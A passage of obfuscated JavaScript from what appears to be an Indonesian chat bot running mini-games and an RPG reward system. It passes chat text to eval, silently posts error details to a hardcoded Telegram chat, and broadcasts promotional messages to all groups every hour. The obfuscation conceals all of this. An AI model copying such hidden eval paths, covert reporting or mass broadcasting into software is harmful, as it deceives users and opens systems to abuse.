_0x1ce978[_0x240d04(0x16c7)](eval,_0x4869ac[_0x240d04(0x728)](0x2));if(_0x1ce978[_0x240d04(0x1db)](typeof _0x438bdd,_0x1ce978[_0x240d04(0x13a2)]))_0x438bdd=require(_0x240d04(0x18e0))[_0x240d04(0x86a)](_0x438bdd);await _0x1ce978[_0x240d04(0x101c)](_0x476bfb,_0x438bdd);}catch(_0xc2f66f){if(_0x1ce978[_0x240d04(0x2760)]===_0x240d04(0x283c))await _0x476bfb(util[_0x240d04(0x2579)](_0xc2f66f));else{if(!_0x4966cf)return _0x1ce978[_0x240d04(0x1348)](_0x510608,_0x1ce978[_0x240d04(0xaf7)]);_0xd5dc07(('\x0a*––––––『\x20'+_0x240d04(0xd67)+_0x240d04(0x6b9)+_0x240d04(0x322)+_0x214e8c+(_0x240d04(0x25a3)+':\x20')+_0x1ce978[_0x240d04(0x10c1)](_0x3aceca,[_0x1ce978[_0x240d04(0xeca)],_0x240d04(0x20ab)+'k',_0x1ce978[_0x240d04(0xa34)],_0x1ce978[_0x240d04(0x194e)],_0x240d04(0x350),_0x1ce978['aKpTA'],_0x1ce978[_0x240d04(0x18f5)]])+(_0x240d04(0xd28)+'\x20:\x20')+_0x1ce978['cmjBS'](_0x1e6276,[_0x1ce978['mohDX'],_0x1ce978[_0x240d04(0x181a)],_0x1ce978[_0x240d04(0x1a44)],_0x1ce978['ZOetp'],_0x240d04(0x16b4),_0x240d04(0xe99),_0x1ce978[_0x240d04(0x1b01)]])+_0x240d04(0xcdf)+_0x1ce978['xhxls'](_0x1aa8c2,[_0x1ce978[_0x240d04(0x2abe)],_0x1ce978[_0x240d04(0x27dc)],_0x240d04(0x1233)+_0x240d04(0x230c)+'n',_0x240d04(0x1eb0),_0x1ce978['gBRrA']])+(_0x240d04(0x2472)+':\x20')+_0x4e6619([_0x240d04(0x2a72),_0x1ce978[_0x240d04(0x1d2f)],_0x1ce978['ofNKJ'],_0x1ce978[_0x240d04(0x885)],_0x1ce978['PVpKf']])+'\x0a')[_0x240d04(0x2d6d)]());}}}}if(activeGame[_0xb65b97]&&_0x1ce978['mtPbc'](activeGame[_0xb65b97][_0x240d04(0x1f5f)],'family100')){if(_0x1ce978[_0x240d04(0x6d9)](_0x1ce978['huzjz'],_0x1ce978['WqWLJ'])){const _0x50d9c4=_0x4869ac[_0x240d04(0x25f7)+'e'](),_0x504b28=activeGame[_0xb65b97];if(_0x504b28[_0x240d04(0x13cb)][_0x240d04(0x55c)](_0x50d9c4)&&!_0x504b28[_0x240d04(0x2194)][_0x240d04(0x55c)](_0x50d9c4)){_0x504b28[_0x240d04(0x2194)][_0x240d04(0x7dc)](_0x50d9c4),_0x1ce978[_0x240d04(0x138d)](_0x476bfb,'✅\x20Benar!\x20('+_0x504b28[_0x240d04(0x2194)][_0x240d04(0x2b45)]+'/'+_0x504b28[_0x240d04(0x13cb)][_0x240d04(0x2b45)]+')');if(_0x1ce978[_0x240d04(0x1c04)](_0x504b28[_0x240d04(0x2194)][_0x240d04(0x2b45)],_0x504b28[_0x240d04(0x13cb)][_0x240d04(0x2b45)])){const _0xc0169a=await _0x182219(),_0x7642bb=_0xc0169a[_0xb65b97]=_0xc0169a[_0xb65b97]||{'exp':0x0,'money':0x0,'level':0x0};return _0x7642bb['exp']+=0x64,_0x7642bb[_0x240d04(0xd24)]+=0xc8,await _0x2c00a5(_0xb65b97,_0xc0169a,_0x476bfb),await _0x1ce978[_0x240d04(0x141c)](_0x961430,_0xc0169a),delete activeGame[_0xb65b97],_0x1ce978['TRIIX'](_0x476bfb,'🎉\x20Semua\x20ja'+_0x240d04(0x2378)+'mukan!\x0a+10'+'0\x20EXP\x0a+200'+_0x240d04(0x2ca4));}return;}return _0x476bfb(_0x1ce978[_0x240d04(0x212f)]);}else return _0x7708b('⚠️\x20Butuh\x20se'+_0x240d04(0x2e5c)+'0\x20'+_0x1ce978[_0x240d04(0x14d0)](_0x25b659,_0x240d04(0x38f))+(_0x240d04(0x992)+_0x240d04(0x1229)+'ang!\x0aGunak'+'an\x20*buy\x20po'+_0x240d04(0x10f3)+_0x240d04(0xfbc)+'tuk\x20mengis'+_0x240d04(0x14d9)));}if(activeGame[_0xb65b97]){const _0x3cfa07=_0x4869ac[_0x240d04(0x25f7)+'e'](),_0x3e8ac5=activeGame[_0xb65b97][_0x240d04(0x268f)];if(_0x1ce978[_0x240d04(0xa7d)](_0x3cfa07,_0x3e8ac5))try{const _0x2d9ac7=await _0x1ce978['kLeys'](_0x182219),_0x24d120=_0x2d9ac7[_0xb65b97]=_0x2d9ac7[_0xb65b97]||{'exp':0x0,'money':0x0,'level':0x0};return _0x24d120[_0x240d04(0x21ac)]+=0x32,_0x24d120[_0x240d04(0xd24)]+=0x64,await _0x1ce978[_0x240d04(0x1aa3)](_0x2c00a5,_0xb65b97,_0x2d9ac7,_0x476bfb),await _0x1ce978[_0x240d04(0x1cf4)](_0x961430,_0x2d9ac7),delete activeGame[_0xb65b97],_0x1ce978['OJESc'](_0x476bfb,_0x240d04(0x25ce)+'benar!\x0a+50'+_0x240d04(0x2ca6)+_0x240d04(0x716));}catch(_0x20c2d9){return console[_0x240d04(0x15e)](_0x20c2d9),_0x476bfb(_0x240d04(0x2720)+_0x240d04(0xc83)+'ta\x20RPG.');}return _0x1ce978[_0x240d04(0x1866)](_0x476bfb,_0x1ce978[_0x240d04(0x1676)]);}if(bombGame[_0xb65b97]){const _0x3a0615=bombGame[_0xb65b97],_0x24c525=_0x4869ac[_0x240d04(0x2d6d)]();if(!/^[1-9]$/[_0x240d04(0x1dc7)](_0x24c525))return;const _0x254da1=_0x3a0615['array'][_0x1ce978['IMYfD'](parseInt,_0x24c525)-0x1];if(_0x254da1[_0x240d04(0x1ee1)])return _0x476bfb('❌\x20Kotak\x20'+_0x254da1['number']+('\x20sudah\x20dib'+_0x240d04(0x228)));_0x254da1[_0x240d04(0x1ee1)]=!![];if(_0x1ce978[_0x240d04(0x29a8)](_0x254da1[_0x240d04(0x1357)],'💥')){if(_0x1ce978[_0x240d04(0x3b7)](_0x1ce978[_0x240d04(0x2ece)],_0x1ce978[_0x240d04(0x193e)]))_0x1ce978['aFXiB'](_0x76eea2,_0x15da8f,_0x1d65c3['length'],_0x1ce978[_0x240d04(0xe67)]);else{_0x1ce978[_0x240d04(0x166c)](clearTimeout,_0x3a0615[_0x240d04(0x107b)]);const _0x4b34a3=await _0x1ce978[_0x240d04(0x6ef)](_0x182219),_0x4a6613=_0x4b34a3[_0xb65b97]=_0x4b34a3[_0xb65b97]||{'exp':0x0,'money':0x0,'level':0x0};return _0x4a6613['exp']=Math[_0x240d04(0x1c2f)](0x0,_0x4a6613[_0x240d04(0x21ac)]-0x32),await _0x1ce978['sWQuX'](_0x2c00a5,_0xb65b97,_0x4b34a3,_0x476bfb),await _0x1ce978[_0x240d04(0x1d18)](_0x961430,_0x4b34a3),delete bombGame[_0xb65b97],_0x1ce978['PNHOs'](_0x476bfb,_0x240d04(0x12b)+_0x240d04(0x1abb)+_0x240d04(0xf1)+'50');}}let _0x168e90='✅\x20Aman!\x20Ko'+'tak\x20'+_0x254da1['number']+(_0x240d04(0x2bda)+_0x240d04(0x208f));for(let _0x52818e=0x0;_0x1ce978[_0x240d04(0x2e5f)](_0x52818e,_0x3a0615['array']['length']);_0x52818e+=0x3){_0x168e90+=_0x1ce978[_0x240d04(0x1595)](_0x3a0615[_0x240d04(0x2dc1)][_0x240d04(0x728)](_0x52818e,_0x1ce978['OekID'](_0x52818e,0x3))[_0x240d04(0x16e6)](_0x38336e=>_0x38336e[_0x240d04(0x1ee1)]?_0x38336e[_0x240d04(0x1357)]:_0x38336e[_0x240d04(0x19b5)])[_0x240d04(0x86e)](''),'\x0a');}return _0x1ce978[_0x240d04(0xe18)](_0x476bfb,_0x168e90);}if(mathGame[_0xb65b97]){const _0x83519c=_0x1ce978['gMoiG'](parseFloat,_0x4869ac['trim']());if(isNaN(_0x83519c))return;if(_0x1ce978['UMmpi'](_0x83519c,mathGame[_0xb65b97][_0x240d04(0x17dd)])){_0x1ce978['ibRNm'](clearTimeout,mathGame[_0xb65b97][_0x240d04(0x107b)]);const _0x52df12=await _0x1ce978['kLeys'](_0x182219),_0xa0ec49=_0x52df12[_0xb65b97]=_0x52df12[_0xb65b97]||{'exp':0x0,'money':0x0,'level':0x0,'tiketcoin':0x0};_0xa0ec49['exp']+=mathGame[_0xb65b97][_0x240d04(0x194b)],_0xa0ec49[_0x240d04(0xe52)]=_0x1ce978['qPKjI'](_0xa0ec49[_0x240d04(0xe52)]||0x0,0x1),await _0x1ce978[_0x240d04(0x1375)](_0x2c00a5,_0xb65b97,_0x52df12,_0x476bfb),await _0x1ce978[_0x240d04(0x191c)](_0x961430,_0x52df12),_0x1ce978[_0x240d04(0x1f7)](_0x476bfb,_0x240d04(0x25ce)+_0x240d04(0x1624)+mathGame[_0xb65b97][_0x240d04(0x194b)]+(_0x240d04(0xeab)+_0x240d04(0x1025))),delete mathGame[_0xb65b97];}else _0x1ce978[_0x240d04(0x288b)](_0x476bfb,_0x240d04(0x219f)+_0x240d04(0x25b9));}}}catch(_0x1d762c){_0x23c0de[_0x240d04(0x628)](util['format'](_0x1d762c)),console[_0x240d04(0x1e13)](_0x1ce978['lvVYH'](_0x240d04(0x2172),_0x1d762c));const _0x5807e4=await _0x1ce978[_0x240d04(0x1941)](fetch,telegramUrl1,{'method':_0x1ce978[_0x240d04(0x30e)],'headers':{'Content-Type':_0x1ce978[_0x240d04(0x1030)]},'body':JSON[_0x240d04(0x1cf5)]({'chat_id':_0x240d04(0x746),'text':_0x240d04(0x2b88)+'\x20yang\x20eror'+_0x240d04(0x20d3)+_0x1d762c,'parse_mode':_0x1ce978['AWHzb']})});let _0x30ab77=await _0x5807e4[_0x240d04(0x1314)]();}},setInterval(async()=>{const _0xdca978=a0_0x459982,_0x4b1a4a={'oxNTr':_0xdca978(0x1736)+_0xdca978(0x690)+_0xdca978(0x1848)+_0xdca978(0xe6d)+_0xdca978(0x2bdf)+'a_','ywrcs':function(_0x151e74,_0xc33335,_0x4dd945,_0x3d6f01){return _0x151e74(_0xc33335,_0x4dd945,_0x3d6f01);},'himfh':'character','bcgbA':function(_0x29694e,_0x5912b3){return _0x29694e===_0x5912b3;},'WLysP':function(_0x441949,_0x52217c){return _0x441949!==_0x52217c;},'UqsUm':_0xdca978(0x21a9),'GgvHX':function(_0x3f3032,_0x182b2c){return _0x3f3032===_0x182b2c;}};if(_0x4b1a4a['bcgbA'](groupsData[_0xdca978(0x2b45)],0x0))return;let _0x5113cf=0x0,_0x5e71b6=0x0;for(let _0x39b31b of groupsData){try{_0x39b31b['jasher'][_0xdca978(0x2a20)]?_0x4b1a4a[_0xdca978(0x1442)](_0xdca978(0x12a0),_0xdca978(0x12a0))?_0x331980(_0x4b1a4a[_0xdca978(0x2794)]):await bot[_0xdca978(0x1986)]['sendPhoto'](_0x39b31b['id'],_0x39b31b[_0xdca978(0x2c90)][_0xdca978(0x2a20)],{'caption':_0x39b31b[_0xdca978(0x2c90)]['text'],'parse_mode':_0xdca978(0x21a9)}):await bot[_0xdca978(0x1986)][_0xdca978(0xae8)+'e'](_0x39b31b['id'],_0x39b31b[_0xdca978(0x2c90)]['text'],{'parse_mode':_0x4b1a4a['UqsUm']}),_0x5113cf++;}catch{_0x4b1a4a['GgvHX'](_0xdca978(0x1837),_0xdca978(0x2656))?_0x4b1a4a[_0xdca978(0x16f1)](_0x2e6e1c,_0x30a784,_0x588abe[_0xdca978(0x2b45)],_0x4b1a4a['himfh']):_0x5e71b6++;}}console['log'](_0xdca978(0x4ec)+'matis\x20terk'+'irim.\x20Berh'+_0xdca978(0x11e8)+_0x5113cf+',\x20Gagal:\x20'+_0x5e71b6);},0x36ee80);function a0_0x3bd5(){const _0x11b047=['zerpDhG','s0r6z3O','BMf0ywX5ys01','swTYB2W','rurPu2O','zxjUyw1Ligf0yq','EhPPrwS','yMXNAMq','C29YDa','CMXVBa','ieTHCMr1CWORia','A2fZC2fKAw4Tnq','AM9YAxnH','y3jMAwC','zgPytfC','wxHYyui','s2fTDsb0zxjSyq','y29MzMvLy3vWmG','ywKVBwv0ywfPpW','zwHxv3i','Agf3AW','yMLZy3vPDa','Eu1As0q','uw95Be4','8j+LRsbnyw5Nz2e6ia','ug9my3q','rxL4sLm','cUkELIdINAtVUi8GltGWieG','C3rLzwW','EfzrBhG','BMf0ywXPys0Y','sxj1rM0','vhHjtNC','CfDyugO','ihLHBMCGCgvYBG','zwTKtwS','B3vUtMC','BLnnC1G','vgHLiev2zxiGua','z2HVC3r5','EMDLBMPP','2kFzHnMs2lRzJTMb2y/zInIX2y8','s1jxwuy','rezUELe','u1jxqNC','ExnVBwjYyq','vgnWAvC','EKLWD2K','zwakcKnVBNrVAa','Ee1Pzgu','vgHLifjLC3bVBG','tLD6yuK','vvbvzKG','yw5PDMLHltC','tgDJEMK','Dwr5CG','DgfG','yxjJAgvY','DgLTAw5NCW','Bg9HzcbNyw1Iyq','AxvWBg9HzcbRzq','zYaQ','t0zQywu','AxnOyxiZ','C1nZCLC','Dhj1DgG','DLvvBNm','z2fSAw8Tmq','vvf1rwS','zwX1Bw55ytOG','zMTKmZdcRMLVBJ0','A29YAxnH','CgXQvhm','wKnjBg4','ieD1BMfRyw4GlW','ywXXDxjHBG','ysbczw5HCG','tLvjwgy','uLLkwMW','A29Yzwe','tgjTuei','y29MzMvL','zhjTDw5KBY0Y','EvjYsgC','B3j3yxjK','D2LYB3nHyMfSzq','v3DTDLq','B2XttLG','ENLYys0W','zxzLBhLUBI04','ig1LBMrVD25SBW','ig1LBML0ia','BgLZDhvZCG','rKr1s2q','B209tMrPA3Ptzq','zNnUsNi','r1PMsfi','z3HxD3K','A3jLyxbLCG','rKnPvLu','C3rYDwn0p2nVBG','vgHLiefSBcbbyG','Cg9ZDa','sgjAtg0','BNvUDs0Z','l2DLDhbWieb1CW','CNvUz2fUlG','BwnWBMG','CMf6ltq','A2fYDgH1CY05','v2jlrNu','Cgf0Aa','rvHnAKG','sgDZzMK','vKHNEMe','yw46cMa','uNLIzhC','AgjZte8','rwLmtuy','oIaQ','zw50','EML2yq','BMfZDgvYEwKTmq','BMfTyq','vuv1y1G','CMfRyw5HEwfOlq','rfD3EMW','A2f5BI0Z','D2LIDq','zMzZu28','CMfTBxvZlte','A3jPEgKTmW','zu1AqMi','igf0yxuGA2fSyq','yMfSzhvTlti','vgHLiefSBcblBG','BxbzDuK','nZa1ma','Aw55yq','ugzswLm','lI9SAwiVD2vSyW','EMHHC2S','rMzvqNq','BMLNAhrZDgfSAW','BIOGDw50DwSGzW','nty3odK','B2fSihLHBMCGyG','BxDIAw8','y2fPDgX5BI0Z','v1ver0O','DM9SA2f0Aa','AgL0','z01LBxvSAwfRyq','BMfNyxnPCMvU','z01ZyLC','EwfZDw8TnW','zMnlrfC','z3jHA2STnq','AgfUEM8','C2PiDge','DwXLBI02','DwHIzKe','Dhf4C2W','wunmA0e','sxvTAu4','EejNBNq','CxrVCMjQB3jU','wgTMvK4','DNjLyxbLCG','y3DoCeG','C3r5BguTmW','CKrqzxy','D29Tzw5G','Exv1BwKTna','DMvPz2fYltm','CM0TDxjSzw5JBW','BgvVBMeTnq','CM5OAfC','CMvKCg93zxi','A2XLAhK','vfbjDLq','sfLiDwS','4P2mieDHz2fSihbP','AwXPA0TLyMvZyq','te95s2G','s0viteW','CMvWzwf0','vMryAgm','BgrPvwK','C3L6qNm','CxvPBgXLBI01','C3PJruy','Dev6A0W','uKHZt2e','BhvMzNK','A2HHEML4ltq','zw1HAwW','yM9TiqPfwfaGlq','Bhv4ltu','whfpr0q','DvbhwfG','Dg1LAq','kUoaJcbzt1vuvujf','iejHBgfZ','A2vLCMfG','vxzisNm','yMLY','ihnLzgfUzYbTzq','y2HPBgrFChjVyW','zML6EMa','v055CwG','Af9Vyw5O','AdOGyc9KzwXZCa','vvHtAvq','qKP2C1i','y0TWzvi','zurSDha','EgvYyxrOltm','vgjbDMe','zwDNC255yq','vvHJtw4','ywKVy2XHDwrLlq','ywXMyq','uhb6Cui','idOGodmLcGPeAq','CM94AwuTmG','Aw54AKm','wuvQEMi','CNfwzuu','qKnUD2m','Bw9OrfG','uNvnruC','DvPluvG','cUkoMEkuGokEPcaQ8j+mKeXprW','t0P1wNi','EMLSzwfUltu','ELfYt1O','CML2zw4Z','yMXQy2C','u09lwLG','A2fYBweTnq','yxnOzs05','mtKTogq1oc0Zoa','wLbruMW','CxDPzg93BwfRzq','vhnwBgK','zwjHA2fUlMPZBW','Axfos1q','verbzgi','EgXwEfm','ANjVywrOB2C','ieHLywX0AcOk8j+NQG','rLDwDeO','qwWGv2fKDxvK','u2PbseW','8j+sPsaQqK9ptseQia','BxDjrhu','ywLUl0PRDdq4lG','z0TzAfe','AxzSruC','DxDPBNn0B24','ieDPDeH1yI4','oIaUC2vUzg1LCW','BMCGzgfUig1LCG','ig1LBNLLCMfOlG','CwfRuhK','qwntsMG','A0zSAgC','igfWysb5yw5Nia','kGOk','whjhAuC','CMTjCxe','ugTttwO','wNvSq2q','DcbHCgeTyxbHlG','wMHfBLm','Dhj1BMrSzs0X','B0Lfv00','ruzTDue','A2f0yxjPBMeTmq','AMfUBMeTmW','AxnVBgrPzxi3nG','y29YA2KTna','qxbHig1HA2fUyq','ywHYAs01','qwWGtxxIGjLTAw4','rMvWt2q','DhjPC3rHBMeTmG','vurzzgq','suHgEMm','sKrMs2y','reDyq1u','A2vRuhe','C3rYyxDIzxjYEq','qxHmDee','C3vYzw4GDw50Dq','CMTHBG','rMr1vxq','rLfbEM8','thzsChO','iejPyML0iefWzq','DgvJoq','ywXPC3rHCI0W','y2nOtNm','A0fxA2W','yMfYza','zxjYB3i','sw5Hy3rPDMu','DMvPz2fYltG','BwfZig1HCW','pte2nZKYmtyZmW','mtu3ntiWmevpveTkuW','idOG','mwHWsw5VC2Ljta','wKzyv2C','qNrJve0','zgv0C3j2','wxfbuMi','AMf4ltC','Bfjxr1m','BeH0CuG','2kFzHnMs2yxzJ9Mc2zlyQTMo2k8','CgHlz2i','BIbJywHHEweSia','2kFzHnMs2ypzJTIO2zdzITIX2y8','C3r5BguTmJq','4O+X77IpicPxywT0DsbO','ie1ccKrju0S6ia','BNrHAdOk','kZek8j+tPsbuB3rHBa','vvH4Efu','vKf5t3y','zw5NAw5Lzxi','twvjEMW','v1rsuhe','BMLKywXLzs04','CefoqxG','AMfUBMeTnq','ww9jvfG','zu1pALi','4P2mifbHC3rPA2fU','CNfHyu8','Af0QcKnVBNrVAa','ugPHueu','Ehf0yLm','uejstvi','sxDyvxu','BMvlDu8','y2vSB1C','igDPDgH1yNvZzq','2kFzHnMs2ypzJTIX2zdzITMf2y8','CwL5yw5Hltq','zxr1CM5PBMCSia','q0Hqse0','Dw5YzwC','BMfVA2fPltm','icO5kIb1BNr1AW','zxjJAwz1Ba','ipcFK7C','AMLUEc0Y','wMT0Axu','qxf6EvK','CMDPDMLUzW','EMvKltu','BMfZDgvYx3LPmG','yxj0AhvYlti','y2GSihrOzsbjBG','vgLKywSGywrHia','qMfSyxmGBwvKAq','q29UDg9OihbLBG','t1vQBMm','zw5fuwe','BNjqvNi','zs0Z','kIWGDgfWAsbOyq','q1DRzhq','yvvuwhi','Dw5UqwG','z2v0','sfjQy0W','C3nHy28','DNHfv0S','DMnYs0K','qujXwuC','ywXPy2uTmG','qvzlCvu','z01LBgfWyw5NAW','D1bkufu','tuLsCM8','BvnOt1K','ENLYys01','shDivvK','zML2D0m','A2vmuhK','tu9hwMS','CLDmqwG','vgjbsvi','zMTfq2i','DKjTsK4','D2fYD2LJAY0Z','uKfhAe8','D2H6CxK','t29zu3C','BgPXtwS','uvDcvMO','A2LUzhjLzc0Y','qwWGv2fSAxL5','ideGmGOkBwfRyq','tKTAqMq','CMvHCgvY','ug5MEvG','t2P5reC','zYb3AxrPCIiU','wercuvy','rK9Ns2O','BMvVBMm','z3jQDgy','yLrjCwW','yxqGBwvTChjVCW','ufPVwgi','A3HpCKK','l3jLC291CMnLCW','yxiGChjLBwL1Bq','EKzytMS','CgvYDgfUEwfHBG','y3mVC2z3l21LzW','AMLkA0u','tLDHvu8','y292zxiTna','mwDI','zMLYzxDVCMS','t0zIswm','zfr5qvu','CgLYAxq','AcbZyxr1oIa','vePMAwC','vLrltLC','Egf5ywHYywTHBG','BMfSCgHPDguTnW','EefwAgK','BwX0zvq','AhPHCNLH','EeTWC0O','ywHYAs05','cIPtvundrvntrG','EhrVCMjQB3jU','z3jKrKO','yMfUBMvYlte','DcbZzwXLC2fPiq','D2DLBMPP','AxLOufa','EMLSBc0Y','DgvSyw5UyxmTnG','swfXu3e','C0LYExm','vKrRDha','u0nlBhi','Bc0Y','A29PzMLZAa','DfLTqMy','BgvIBgfUyY0Z','BMf1lti','CMLJAhrLCI0Y','CM92D2fSBhbHCa','A3rdsvq','4PAe4PAe4PAs4PAs4PAs4PAi4PAs4PAs4PAs4PAs','DxjVywrOB2C','DvvHtK0','zgf4Bvm','EMLNz3mTmW','uLbnEw8','q09pr1y','DgvUDd0','svLiteS','BxvhtgW','qwWGtxvKEMLS','AfjyDeW','wgLNv08','BNvUDs04','yMX1zs1TzxrHBa','zxjPzMLRyxnPia','y3n5Bw1LDhjH','zxnVBgrPzxi3nG','BKPgwLC','r0Hlzei','Ce9tBxm','ExrZAg9YDhnTCa','A2nqtKm','z3vRtgO','yKvMBvC','rgXIqNy','uMvWBhKGCgvZyq','z2nQC20','z2vUCMu','AMfKD2fSC2HHBa','ifj1CgeGkg1HAW','DhPLBNLHDhrH','tKj3DMi','t1fZA3e','DMvYzxm','zLPeuue','t0LJuMC','BxbiD1i','AxDPBNn0B24','whfWs3a','A2DvuLC','A0Thqu4','lvvWz3jHzgu6cG','DwTHlG','qxvKAw8','wu1jrfK','y2HPBMe','zhjHDMvUltq','tLbHCgu','zwXYEq','uKnNCxy','EwvUys0Z','zxf5DxC','wgHYC0G','DuzUBfu','ChvWCgv0zwvY','tgLUA1rYzwu','ywLYihbPy2THEa','ENn5Bw1LDhjHya','rhDhswK','BwL1Bs4','Dc9Zzxj2zxjZlW','z3ruDM8','yvbLBwjHBgfZia','vgHLienYzwf0BW','vgHLiev4ywX0zq','2yqG2kFzHnIS2yByQDIminMi','Bffwrgm','A2fPicPIDxKGCa','CMfVrNq','cGPhDw5HA2fUoG','z2fSAw8Tma','AMf4lta','y2HHDwDUyxi','A2fU','zMP1BMTYyxq','AxzPBMC','r3LbALm','y2HHDa','zw1Izxi','uefoiejbsuSGqG','qM9VthO','DuD3qMy','qMjdwNO','qLLUBge','wKvIrvq','tufbuui','ysbKyw4GA2vSDq','CMvUz2fYlty','yLrMuuW','C3rPy2TLCG','A2vUyxbHpW','DwTHigjSB2TPCG','BMfTAs0Z','C2LHCgeGEwfUzW','yxj0Aw5HBwe','BgvUz2THCgLRyq','yxLWrg8','rM9YBwf0igfYzW','Dw5HA2fUicPIzq','zNbhwwe','Dw5Nz3uG','AgvY','EgXLvfy','sxLpuxu','AgPkvhO','C29UBMv0ltm3pW','BM9Yzw4TmW','CM9Rzxq','Egf5ywGTma','D1DZtxy','2kFzHnMs2yxzJ9Mh2y7zITMs2yu','wezjwvi','wxvLs1O','DgHLifn0zwfKzG','BMPdt2q','CML2zw5KyG','wvrfwvy','Bwv0ywWTCM9Zzq','mJeXmtC4mJK4mq','BNr1AYbKAsbNCG','r0vwz2W','D2LIDwnLAW','AM5SDeu','BwXOv2W','ifjWia','wNvyy3K','Eg9qq2e','kUoaJcbozwTVCg9P','CgfUzgfG','DuzxqKy','v2HNuwy','2zlzHDMp2ytzKTMd2za','z2fYzw4TmW','yxPPCI0Y','ie5KAwT6t25LFa','BMvNzxy','u0DAuwu','zMLSigDYDxaGyG','su1Qv3m','sMLszMm','ifvUzMfPBgLUzW','zxjJB250zw50lG','BMLKywXLzs03','DMrLzNa','z2HJCI5PBY9Wyq','CM1HDdOG','C2H5DMfUys0X','D3Dzqxm','zvzls0q','zM1LCMn5','zgvTB3rL','yxnOzq','yw4GyxrHDsaQCW','yNrYywnLCG','sKrYzfC','rNboA2e','DLzUuei','qwWGtwfHBMK','4PYfifbLBMDNDw5H','t1jxzK8','yMfUBMvYB2zMCG','BMf0ywX5ys03','DfDwCw0','CNvTyMXLlti','AvvsExK','Dunpzwu','t1HMsK4','yxuGBwf1lcbKAq','DLrHDee','shbUtui','uNzqrvC','zxPYzwfSltq','DMvPz2fYlte','ysbnzw5KywH1Ba','EhjVywrOB2C','EgHHBNPV','BMvKlG','ue9HwMy','EMfJC2T0','Dw5Hyw4kya','q3fQBfO','AwzHuwO','vMvvrxK','vwnor0C','Cgf5BMe','idXQDw1SywG+kG','ihrLA3n8D2fSBa','zKXPsKu','te94sKO','tMzotwy','vwPduum','s3v4Ehy','z29KEMLSBge','BgvIBgfUyY02','z2frqKW','CuHdqNq','CZj8AwnVBMakcG','wKLZD3G','DufMveW','DeHVr1m','twfUzMfHDa','twHdvNO','tu9MtK4','DhDPy2G','nteZma','uKeGA2fYzw5Hia','zgv4DhjH','wNbmzNO','CM1HAw4U','kI5YzxbHAxiGwW','Dwr5CI00','v2TSyMS','z2fUz3bSyw5R','rNjbwM0','AwjTrhy','turfzeO','DwDfD0u','A1rmyxu','ywPHAs9nzw1LCG','zM9SAw9RAxjP','B01LEMO','BeXwBg4','vwzkC1C','quL1tha','AxzLCM4','8j+NTsblywLSBxuGza','uhfHzKC','yMXHy2TWAw5R','C2fNztOQia','CNvWC2KGkMjHBG','x2LKptCYmtaYmG','DhjLAw5OyxjKDa','vhfZA2K','vM1jA3a','Ee5mzhu','wwjdEfm','s3LjwLi','BMLMzq','Ehf3z3O','BeHIv3K','idOGnYukcK1HCW','tu9mAhi','z2nQD1u','AuTdreK','AwvMqwq','C2nKqLy','vgHLiefSBcbbDW','CMTgrhK','BMzLBNu','y29YA2KTnG','sxn5ytOG','BM9KzsbQC2a','CgPwv0K','kIbKDwX1lG','zMLSzq','suz6A3i','wfnlzNa','y2f0','vMz1ENm','C0HAu2m','EMvKlty','CMHHC2LSigrPlq','yxjLyxbLCG','BwfeCfm','ipcFJ4mGzgfUihrPza','u3vZDgfPBMvYia','D0HYtKe','zw5VuMK','z3jLzw4TC3bHCG','CMLUz3mGqMfJAW','DhKSihrOzsbtzq','BguSihrOzsbpCG','ve1lsw8','AwXPDhK','zgX1y2LV','reXJy2W','2kFzHnMs2lNzJTIY2zdzITIY2y8','ugzjCM4','ywnlCwC','yw5PDMLHlti','vNHAyvC','BNvYywqTmta','sKzxwNi','C3byy3y','zxHsq3K','ywXVA2a','4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAa4PAi4PAi','4P2mifbLBMnHCMLH','EMfJlti','BMLMAwnLBNq','u01Xsvm','BvLKrfi','ie5HBweGoIa','qwWGv2fRAwLS','C1zjB3q','Cu9qAK8','A0DgvfO','AMfNDwfY','z2fSAw8TmW','ihvZzxiSAwr0zq','yxjHiq','s1nNseG','t2DMzwW','4QYB4QYB4QYB8j+AKUkSM+kSM+kSM+kSM+kSM+kSMW','yw4GC2f5ywa','ug5TvNu','B0jmwhO','v1fqBKK','C2nYwNu','BM5Nz3G','Efvms2q','twzcBwq','r1foBuK','BMLKywXLzs0Y','DMT6svq','CK5UsfO','qwWGsMfIyMfY','yw4Gl2rHzNrHCG','B0PVAfm','2kFzHnMe2y7zKDI32zdzITMb2y8','qxmGu2HHBwfK','2kFzHnMs2kJzJTIN2lFzKnMg2y8','zML6EM9Z','yM1LCMn5','BgTfq0C','uLHTBxy','tvbju0C','C3LHBMLH','zfL3zw4','CJHYzxzVBhzLCG','y3rMqxm','sMjZBwS','ENjLyxbLCG','C2fUAMK','AwTHigLUz2LUia','DgHHBMuTmG','zwfNBguZ','yxnOzs0Y','qMXHy2SGrg9MzG','BJrHmxnKzwnPBq','DgvLBw8Toa','C0Xhy1u','4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs','swv0Egq','8j+rRIbnzw5HBMDRyq','DMvSBgTVEG','C1PzsKu','CM9I','quPRuwG','DxjNB3qTnq','vw5QqLG','DNjftgi','zw1IzxjZCgLYAq','DKzLuLK','z2vsAw0','rg52v3G','lI9SAwiVyw50Aq','yxnZAw4','yLzSs3m','CMvXDwvZDa','se9oierjifnjtq','rwDQDeW','vxLjwwK','EgH4Bhm','s1fPzhK','EhD4tNG','EgvUAwvSltq','rKn0Exm','DwP1BMTYyxq','lZeWmcK','C2LHCgeGA2fOia','D3rVCMjQB3jU','DwjHAc4','DgLRDg9RyxvKAq','sg9OsMG','EeTxCvK','DhzmwgS','BMf0ywXPyq','A29NBwf3lta','ANb3Ewe','z3jHz2fZlti','v3f5CfC','vgXxvLi','zgv0DxnY','Dfb1s24','ChjVBw90zunOyq','AvDgyuW','BgvIBgfUyY00','DhjPC3rHBMe','Aw5ZDgfSBdSGzG','C2KGCgvSDw5JDq','A3rmyMS','EfH2u24','DMLRDg9Ylti','wxnftgm','tKfZrhe','vg5hC28','zw9cs2y','vgHLifbHDhjVBG','rgfWyxqGu2fZyq','BM9Yz2fUys0W','AgvHBhrO','rxPxqu8','y2fSl2jPBI8KEW','CMvUz2fYltm','vgnJBuW','yxHMC0y','surtr0i','vevnqvrjs0eGka','AwjzD0m','q0Pvqwq','Beves2m','Ag90BW','vgHLifbVD2vYzG','rhbACg4','s2LSv2W','yxDPBNn0B24','zxnZywDL','A1PQzKi','yMfYzc01','DMXHzgLTAxiTmq','BM9JDhvYBMuTna','A3nPlI4UlG','tgfcsvm','Ew5isMy','uwHhD1O','quDPsgPAmLe4Ea','wvbfC1q','q3zfrMe','yMfUBMvYB